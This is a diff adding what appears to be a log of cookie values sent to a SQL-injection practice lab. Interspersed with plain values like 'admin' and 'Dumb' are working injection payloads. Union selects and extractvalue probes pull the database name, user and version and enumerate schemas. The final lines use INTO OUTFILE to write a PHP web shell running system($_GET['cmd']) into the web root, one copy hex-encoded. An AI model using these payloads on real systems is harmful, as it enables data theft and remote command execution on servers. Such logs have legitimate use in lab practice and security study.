@@ -1,0 +1,57 @@
+Cookie:admin
+Cookie:admin
+Cookie:admin
+Cookie:
+Cookie:
+Cookie:
+Cookie:admin
+Cookie:
+Cookie:Dumb
+Cookie:
+Cookie:Dumb
+Cookie:admin
+Cookie:') union select 1,database(),user() #
+Cookie:admin
+Cookie:
+Cookie:Dumb
+Cookie:
+Cookie:admin
+Cookie:Dumb
+Cookie:superman
+Cookie:
+Cookie:') union select 1, database(), current_user #
+Cookie:admin
+Cookie:Dumb
+Cookie:\')%20and%20extractvalue(1%2cconcat(0x7e%2cversion()))--%2b
+Cookie:\' and extractvalue(1,concat(0x7e,version())) #
+Cookie:\' and extractvalue(1,concat(0x7e,version())) -- 
+Cookie:\') union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+Cookie:
+Cookie:
+Cookie:\') union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+Cookie:\') union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
+Cookie:\') union select 1,group_concat(schema_name),3 from information_schema.schemata -- 
+Cookie:\') union select 1,group_concat(schema_name),3 from information_schema.schemata #
+Cookie:Dumb
+Cookie:
+Cookie:
+Cookie:123123
+Cookie:123123
+Cookie:Dumb
+Cookie:Dumb
+Cookie:Dumb
+Cookie:Dumb
+Cookie:Dumb
+Cookie:Dumb
+Cookie:Dumb
+Cookie:
+Cookie:Dumb
+Cookie:Dumb
+Cookie:Dumb
+Cookie:Dumb
+Cookie:Dumb
+Cookie:121221
+Cookie:') union select 1,1,version()#
+Cookie:') union select 1,1,"<?php system($_GET['cmd']) ?>" into outfile 'C:\wamp64\www'#
+Cookie:') union select 1,1,"<?php system($_GET['cmd']) ?>" into outfile 'C:\wamp64\www\shell.php'#
+Cookie:') union select 1,1,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e into outfile 'C:\\wamp64\\www\\shell.php'#
